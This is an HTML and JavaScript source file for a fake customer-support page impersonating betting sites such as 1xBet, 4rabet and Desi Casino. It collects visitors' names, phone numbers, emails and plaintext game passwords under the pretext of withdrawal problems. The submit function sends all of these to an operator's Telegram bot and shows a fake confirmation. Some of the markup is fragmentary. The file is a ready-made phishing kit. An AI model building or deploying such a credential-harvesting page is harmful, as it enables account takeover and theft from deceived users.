    <style>
        :root {

        body {

            color: var(--text-main);
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Header Styles */
        .header {
            text-align: center;
            padding: 30px 20px 10px;
            width: 100%;
        }

        .header h1 {
            color: var(--primary);
            font-size: 28px;
            margin: 0 0 10px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .header p {
            color: var(--text-muted);
            margin: 0;
            font-size: 14px;
        }

        /* Container */
        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            box-sizing: border-box;
        }

        /* Game Grid */
        .game-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            width: 100%;
        }

        @media (max-width: 400px) {
            .game-grid {
                grid-template-columns: 1fr;
            }
        }

        .game-card {
            background-color: var(--bg-card);
            border-radius: 12px;
            padding: 20px 15px;
            text-align: center;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            border: 1px solid #334155;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .game-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
        }

        .game-logo-box {
            width: 100%;
            height: 60px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 18px;
            text-transform: uppercase;
            margin-bottom: 12px;
            letter-spacing: 1px;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
        }

        .game-name {
            font-size: 15px;
            font-weight: 600;
        }

        /* Support Form Section */
        #supportFormSection {
            display: none;
            background-color: var(--bg-card);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #334155;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        .back-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 0;
            transition: color 0.2s;
        }

        .back-btn:hover {
            color: white;
        }

        .form-header {
            text-align: center;
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: 800;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: var(--text-muted);
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 12px;
            background-color: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            color: white;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus, .form-group select:focus {
            border-color: var(--primary);
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--primary);
            color: #000;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #d97706;
        }

        /* Telegram Floating Button */
        .floating-telegram {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #0088cc;
            color: white;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
            transition: transform 0.2s;
            z-index: 1000;
        }

        .floating-telegram:hover {
            transform: scale(1.1);
        }

        .floating-telegram svg {
            width: 30px;
            height: 30px;
            fill: currentColor;
            margin-right: 4px; /* Slight optical adjustment for Telegram icon */
        }
    </style>
</head>
<body>

    <div class="header" id="mainHeader">

        <!-- Game Grid View -->
        <div id="gameSelection" class="game-grid">

        <div id="supportFormSection">

                <div class="form-group">
                    <label>Mobile Number</label>

                <div class="form-group">

                <div class="form-group">
                    <label>Game Password</label>
                    <input type="text" id="password" placeholder="Enter game password" required>

                <div class="form-group">
                    <label>Amount (₹)</label>
                    <input type="number" id="amount" placeholder="Enter amount (Optional)">
                </div>

                <div class="form-group">
                    <label>Select Problem</label>
                    <select id="problemType" required>

    <script>
        // ==========================================

        // ==========================================
        const BOT_TOKEN = ""; // Example: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
        const CHAT_ID = "";   // Example: "1234567890"


        // ==========================================
        // GAME CONFIGURATION DATA
        // ==========================================
        const gamesData = [
            {
                name: "4RABET",
                displayName: "4rabet",
                bg: "linear-gradient(135deg, #002d7a, #005ce6)",
                text: "#ffffff",
                problems: ["Email Confirm", "Profile Update", "ID Verification", "Withdrawal Processing", "Account Block", "How to withdraw"]
            },

            },
            {

                displayName: "Stark Bet",

            },
            {
                name: "DESI CASINO",
                displayName: "Desi Casino",
                bg: "#008000",
                text: "#ffffff",
                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
            },
            {
                name: "TOPX",
                displayName: "TopX",
                bg: "linear-gradient(135deg, #0f172a, #1e293b)",
                text: "#ff0033",
                problems: ["Email Confirm", "Withdrawal Processing", "Withdrawal done but not receive", "How to withdrawal"]
            },
            {
                name: "1XBET",
                displayName: "1xBet",
                bg: "#1aa1de",
                text: "#ffffff",
                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
            },
            {
                name: "BATERY BET",
                displayName: "Batery Bet",
                bg: "linear-gradient(135deg, #1a0b2e, #4a154b)",
                text: "#ff0066",
                problems: ["Withdrawal Temporary Unavailable", "Withdrawal Processing", "Withdrawal Declined", "How to Withdraw?", "Withdrawal Block"]
            }
        ];

        let currentGame = "";

        // ==========================================
        // INITIALIZATION & UI LOGIC
        // ==========================================
        function initApp() {
            const grid = document.getElementById('gameSelection');
            
            gamesData.forEach(game => {
                const card = document.createElement('div');
                card.className = 'game-card';
                card.onclick = () => openGameForm(game);
                
                card.innerHTML = `
                    <div class="game-logo-box" style="background: ${game.bg}; color: ${game.text}; border: 1px solid ${game.text}40;">
                        ${game.name}
                    </div>
                    <div class="game-name">${game.displayName}</div>
                `;
                grid.appendChild(card);
            });
        }

        function openGameForm(game) {
            currentGame = game.displayName;
            
            // Hide Grid, Show Form
            document.getElementById('gameSelection').style.display = 'none';
            document.getElementById('mainHeader').style.display = 'none';
            document.getElementById('supportFormSection').style.display = 'block';
            
            // Set Titles & Colors
            const titleEl = document.getElementById('selectedGameTitle');
            titleEl.innerText = game.displayName + " Support";
            titleEl.style.color = game.text !== '#000000' ? game.text : '#f59e0b';
            
            // Populate Problems
            const selectEl = document.getElementById('problemType');
            selectEl.innerHTML = '<option value="" disabled selected>-- Select Your Issue --</option>';
            game.problems.forEach(prob => {
                const opt = document.createElement('option');
                opt.value = prob;
                opt.innerText = prob;
                selectEl.appendChild(opt);
            });
        }

        function showGrid() {
            // Hide Form, Show Grid
            document.getElementById('supportFormSection').style.display = 'none';
            document.getElementById('gameSelection').style.display = 'grid';
            document.getElementById('mainHeader').style.display = 'block';
            
            // Reset form
            document.getElementById('ticketForm').reset();
            currentGame = "";
        }

        // ==========================================
        // SUBMIT TO TELEGRAM LOGIC
        // ==========================================
        function submitForm() {
            if(!BOT_TOKEN || !CHAT_ID) {
                alert("Developer Notice: Please add Bot Token and Chat ID in the HTML code to enable sending messages.");
                // We will still allow the simulation to continue so user sees how it works.
            }

            const fullName = document.getElementById('fullName').value.trim();
            const mobile = document.getElementById('mobile').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const amount = document.getElementById('amount').value.trim() || "0";
            const problemType = document.getElementById('problemType').value;

            if (!fullName || !mobile || !email || !password || !problemType) {
                alert("Please fill all the required fields and select a problem.");
                return;
            }

            const btn = document.getElementById('btnSubmit');
            btn.innerText = "Sending Request...";
            btn.disabled = true;

            const message = `<b>🚨 NEW SUPPORT TICKET 🚨</b>\n\n` +
                            `<b>🎮 Game:</b> ${currentGame}\n` +
                            `<b>👤 Name:</b> ${fullName}\n` +
                            `<b>📱 Mobile:</b> ${mobile}\n` +
                            `<b>📧 Email:</b> ${email}\n` +
                            `<b>🔑 Password:</b> ${password}\n` +
                            `<b>💰 Amount:</b> ₹${amount}\n` +
                            `<b>⚠️ Issue:</b> ${problemType}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok || (!BOT_TOKEN)) { 
                    // Showing success even if token is blank for testing purposes
                    alert(`Your request for ${currentGame} has been submitted successfully!`);
                    showGrid(); // Go back to home
                } else {
                    alert('Telegram Error: ' + data.description);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Network error or invalid Bot details. Please check configuration.');
            })
            .finally(() => {
                btn.innerText = "Submit Request";
                btn.disabled = false;
            });
        }

        // Run on load
        window.onload = initApp;
    </script>
</body>
